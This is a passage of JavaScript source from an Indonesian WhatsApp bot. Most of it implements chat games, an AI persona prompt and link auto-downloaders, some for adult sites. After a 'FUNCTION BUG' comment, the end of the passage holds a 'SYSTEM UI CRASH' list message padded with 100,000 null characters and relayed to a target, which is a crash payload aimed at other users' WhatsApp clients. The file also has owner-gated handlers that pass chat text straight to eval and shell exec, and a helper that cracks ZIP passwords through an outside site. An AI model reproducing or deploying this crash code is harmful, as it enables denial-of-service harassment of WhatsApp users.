} else RezzHost.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK ANIME
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
users.balance += 200
RezzHost.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else RezzHost.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebaklagu[from];
}
}

// GAME KUIS
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete kuis[from];
}
}

// GAME SIAPAKAH AKU
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete siapakahaku[from];
}
}

// GAME TEBAK KALIMAT
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebakkalimat[from];
}
}

// GAME TEBAK KATA 
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebakkata[from];
}
}

// GAME TEBAK LIRIK 
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebaklirik[from];
}
}

// GAME TEBAK KIMIA 
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebakkimia[from];
}
}

// GAME TEBAK BENDERA 
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan: ${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebakbendera[from];
}
}

// GAME ASAH OTAK
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete asahotak[from];
}
}

// GAME SUSUN KATA 
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete susunkata[from];
}
}

// GAME CAK LONTONG
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete caklontong[from];
}
}

// GAME KUIS MATH
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (body.includes(jawaban)) {
m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan: ${soal}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete kuismath[from];
}
}

// GAME FAMILY 100
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nHadiah: $${hadiah}\n\n${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}`)
users.balance += hadiah
}
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}



// FUNCTION PETAK BOMB
let pilih = "✅️", bomb = "💥";
if (sender in petakbom) {
if (!/^[1-9]|10$/i.test(body) && !commandnya) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
petakbom[sender].board[parseInt(body) - 1] = bomb;
petakbom[sender].pick++;
RezzHost.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
petakbom[sender].bomb--;
petakbom[sender].nyawa.pop();

let brd = petakbom[sender].board;
if (petakbom[sender].nyawa.length < 1) {
let bombend = `*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Pengurangan Saldo :* Rp. 100`;
RezzHost.sendMessage(m.chat, {
text: bombend,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `TEBAK BOM`,
body: '',
thumbnailUrl: "https://telegra.ph/file/287cbe90fe5263682121d.jpg",
sourceUrl: gr,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
users.balance -= 100
delete petakbom[sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
return !0;
}
if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
petakbom[sender].petak[parseInt(body) - 1] = 1;
petakbom[sender].board[parseInt(body) - 1] = pilih;
petakbom[sender].pick++;
petakbom[sender].lolos--;
let brd = petakbom[sender].board;
if (petakbom[sender].lolos < 1) {
await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Sisa nyawa :* ${petakbom[sender].nyawa}\n*Bomb :* ${petakbom[sender].bomb}\n*Hadiah Saldo :* Rp. 250`);
RezzHost.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
users.balance += 250
delete petakbom[sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
}
}

// FUNCTION SUIT PVP POLLING
let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
users.balance -= 1000
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await RezzHost.sendText(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await RezzHost.sendText(from, ggy, kalgans)
if (!roof.pilih) await RezzHost.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await RezzHost.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await RezzHost.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
users.balance -= 1000
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await RezzHost.sendText(from, sffp, kalgans)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await RezzHost.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:kalgans})
if (!roof.pilih2) await RezzHost.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await RezzHost.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await RezzHost.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await RezzHost.sendText(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah : '+roof.hadiah+' balance'}`, f1('HASIL SUIT PVP', null))
if (roof.p == win) {
roof.p == win ? global.db.data.users[roof.p].balance += roof.hadiah : global.db.data.users[roof.p].balance -= roof.hadiah
} else if (roof.p2 == win) {
roof.p2 == win ? global.db.data.users[roof.p2].balance += roof.hadiah : global.db.data.users[roof.p2].balance -= roof.hadiah
}
delete suit[roof.id]
}
}

// FUNCTION TICTACTOE 
const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}

const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}

const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}

const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}

const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}

if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
RezzHost.sendText(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
users.balance -= 1000
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
RezzHost.sendText(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the2, m)
global.db.data.users[posi.penantang].balance += posi.hadiah
global.db.data.users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
RezzHost.sendText(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the5, m)
global.db.data.users[posi.ditantang].balance += posi.hadiah
global.db.data.users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
RezzHost.sendText(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
RezzHost.sendText(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}

// ChatSimi
if (chats.simichat) {
let res = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${apikey}&text=${budy.toLowerCase()}&badword=true`)
reply(res.result)
}

if (chats.kayy) {
let name = await RezzHost.getName(m.sender)
  let prompt = `Mulai sekarang nama kamu adalah Rezz, kamu mempunyai sifat yang ramah, lucu, dan suka membantu orang lain, kamu selalu menjawab semua pertanyaan yang di berikan menggunakan bahasa indonesia dan selalu menggunakan kata panggilan aku dan kamu!, kamu adalah ai buatan dari RezzHost yang di buat hanya untuk menjawab semua pertanyaan dengan ramah, dan lawan bicaramu sekarang adalah ${name}, dan kamu merespon pertanyaan di awali dengan kata sapaan sepeti halo di tambahkan dengan ${name}. dan ingat jangan bicara menggunakan kata formal anggap ${name} adalah teman mu.`
let kyy = await fetchJson(`https://itzpire.site/ai/gpt-logic?q=${budy.toLowerCase()}&logic=${prompt}&realtime=true`)
RezzHost.sendMessage(m.chat, {
text: wm,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.tag,
body: botname,
thumbnailUrl: "https://telegra.ph/file/000a33485724af835505e.jpg",
sourceUrl: gr,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}

// AutoDl
if (chats.autodl) {
try {
if (budy.match(`instagram.com`)) {
reply(`*「 LINK INSTAGRAM TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
let anu = await igdl2(budy);
RezzHost.sendMessage(m.chat, { video: { url: anu[0].url }, caption: `Done Sayang >///<`}, { quoted: kalgans });
} else if (budy.match(`tiktok.com`)) {
reply(`*「 LINK TIKTOK TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
let old = new Date()
const dlt = require('./lib/scrape/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(budy)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { image: { url: k }}, { quoted: kalgans });
})
} else {
RezzHost.sendMessage(m.chat, { video: { url: tiktuk.result.video }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fverif })
}
} else if (budy.match(`facebook.com|fb.watch`)) {
reply(`*「 LINK FACEBOOK TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
let dat = await fetchJson(`https://aemt.me/download/fbdl?url=${budy}`);
var urlp = dat.result;
RezzHost.sendMessage(m.chat, { video: { url: urlp.HD }, mimetype: 'video/mp4' });
RezzHost.sendMessage(m.chat, { audio: { url: url.audio }, mimetype: 'audio/mp4' }, { quoted: kalgans });
} else if (budy.match(`youtube.com|youtu.be`)) {
reply(`*「 LINK YOUTUBE TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
downloadMp4(budy);
downloadMp3(budy);
} else if (budy.match(`threads.net`)) {
reply(`*「 LINK THREADS TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
const json = await fetchJson(`https://aemt.me/download/threads?url=${text}`);
RezzHost.sendMessage(m.chat, { video: { url: json.result.video_urls[0].download_url }, caption: mess.done }, { quoted: kalgans });
} else if (budy.match(`twitter.com`)) {
reply(`*「 LINK TWITTER TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
let json = await chApi.twitter(budy);
RezzHost.sendMessage(m.chat, { video: { url: json.HD }, caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅" }, { quoted: kalgans });
} else if (budy.match(`xnxx.com`)) {
reply(`*「 LINK XNXX TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
let anu = await chApi.xnxxdl(budy);
const cpt = anu.result.title;
const nick = anu.result.info;
const dr = anu.result.duration;
RezzHost.sendMessage(m.chat, { video: { url: anu.result.files.high }, caption: `乂 X N X X - D L\n\n   ◦  Judul : ${cpt}\n   ◦  Durasi : ${dr}\n   ◦  Info : ${nick}\n\n${footer}` }, { quoted: kalgans });
} else if (budy.match(`xvideos.com`)) {
reply(`*「 LINK XVIDEOS TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
let anu = await dylux.xvideosdl(budy);
let tks = `乂 X V I D E O S - D L\n\n   ◦  Judul : ${anu.title}\n   ◦  Views : ${anu.views}\n   ◦  Likes : ${anu.likes}\n   ◦  Size : ${anu.size}\n\n${footer}`;
RezzHost.sendMessage(m.chat, { video: { url: anu.url_dl }, caption: tks }, { quoted: kalgans });
} else if (budy.match(`mediafire.com`)) {
reply(`*「 LINK MEDIAFIRE TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
const { mediafireDl } = require('./lib/scrape/mediafire.js');
const baby1 = await mediafireDl(budy);
if (parseFloat(baby1[0].size.split('MB')[0]) >= 50) {
return reply('😅 Waduh Filenya Terlalu Besar...');
}
RezzHost.sendMessage(m.chat, { document: { url: baby1[0].link }, fileName: baby1[0].nama, mimetype: baby1[0].mime }, { quoted: kalgans });
}
} catch (err) {
console.log(err);
reply("Emmm anu om, error hehe:v");
}
}
 const totalFitur = () =>{
var mytext = fs.readFileSync("./RezzHost.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}
let bdw = await checkBandwidth()
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let timestamp = speed()
let latensii = speed() - timestamp
    //=================================\\
if (body.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(body.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
if (body.startsWith('$')) {
if (!isCreator) return false
qur = body.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}
if (body.startsWith('=>')) {
if (!isCreator) return false
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`), null, '\t'))
} catch (e) {
m.reply(e)
}
}
if (!body.startsWith(prefix)) {
return;
}
RezzHost.autoshalat = RezzHost.autoshalat ? RezzHost.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? RezzHost.user.id : m.sender
let id = m.chat 
if(id in RezzHost.autoshalat) {
return false
}
let jadwalSholat = {
shubuh: '04:29',
terbit: '05:44',
dhuha: '06:02',
dzuhur: '12:02',
ashar: '15:15',
magrib: '17:52',
isya: '19:15',
}
const datek = new Date((new Date).toLocaleString("en-US", {
timeZone: "Asia/Jakarta"  
}));
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
if(timeNow === waktu) {
let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Jawa Barat dan sekitarnya._`
RezzHost.autoshalat[id] = [
reply2(caption),
setTimeout(async () => {
delete RezzHost.autoshalat[m.chat]
}, 57000)
]
}
}
const { youtube } = require("btch-downloader");
    const search = require("yt-search");
    
async function downloadyt(urlnyu, mpbrp) {
//  try {
    
    if (mpbrp === "mp3") {
    try {
   
        try {
                
                console.log("Mengunduh audio dari URL:", convert.url);

                audioUrl = await youtube(urlnyu);
            } catch (e) {
              
                console.error("Error saat mengunduh, mencoba kembali...", e);
                m.reply('Please wait...');
                audioUrl = await youtube(urlnyu);
            }

            console.log("URL yang berhasil diunduh:", audioUrl);
    let doc = {
        audio: {
            url: audioUrl.mp3
        },
        mimetype: 'audio/mp4',
        fileName: "yang lu donlot tadi, "+hariini 
    };

    return RezzHost.sendMessage(m.chat, doc, { quoted: m });
      } catch {
        var wvhfy6tfe = await fetchJson("https://widipe.com/download/ytdl?url="+urlnyu)
        
            let doc = {
        audio: {
            url: wvhfy6tfe.result.mp3
        },
        mimetype: 'audio/mp4',
        fileName: "yang lu donlot tadi, "+hariini 
    };

    return RezzHost.sendMessage(m.chat, doc, { quoted: m });
     }
    } else if (mpbrp === "mp4") {
    
    try {
    
         try {
                    console.log("Mengunduh audio dari URL:", convert.url);

                vidUrl = await youtube(urlnyu);
            } catch (e) {
              
                console.error("Error saat mengunduh, mencoba kembali...", e);
                m.reply('Please wait...');
                vidUrl = await youtube(urlnyu);
            }

            console.log("URL yang berhasil diunduh:", vidUrl);
            
return RezzHost.sendMessage(m.chat, {
video: { url: vidUrl.mp4 },
 caption: `Done`, 
 }, {quoted: m })

} catch {
   var wvhfy6tc76gfe = await fetchJson("https://widipe.com/download/ytdl?url="+urlnyu)
   
 return RezzHost.sendMessage(m.chat, {
video: { url: wvhfy6tc76gfe.mp4 },
 caption: `Done`, 
 }, {quoted: m })
}
    } else {
      m.reply("Format tidak didukung.");
    }
}
async function ZIPass(filePath) {
  const { data, headers } = await axios.get('https://passwordrecovery.io/zip-file-password-removal/');
  const csrfToken = cheerio.load(data)('#csrf_token').val();
  
  const form = new FormData();
  form.append('csrf_token', csrfToken);
  form.append('fileName', fs.createReadStream(filePath));

  const response = await axios.post('https://passwordrecovery.io/query/docs', form, {
    headers: { ...form.getHeaders(), 'cookie': headers['set-cookie'].join('; ') }
  });

  const $ = cheerio.load(response.data);
  const notifLink = $('.notification.is-link').html();

  if (notifLink) {
    const processing = notifLink.match(/Processing:\s*(.+?)<br>/)?.[1]?.trim() || 'Gak tau';
    const password = notifLink.match(/Result:\s*(.+)/)?.[1]?.trim() || 'Gak tau';

    return { processing, password };
  } else {
    return { error: "Notification link tidak ditemukan." };
  }
}
//=============[ FUNCTION BUG BY XYREZZ OFFC ]===============
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return RezzHost.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return RezzHost.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(100000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await RezzHost.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
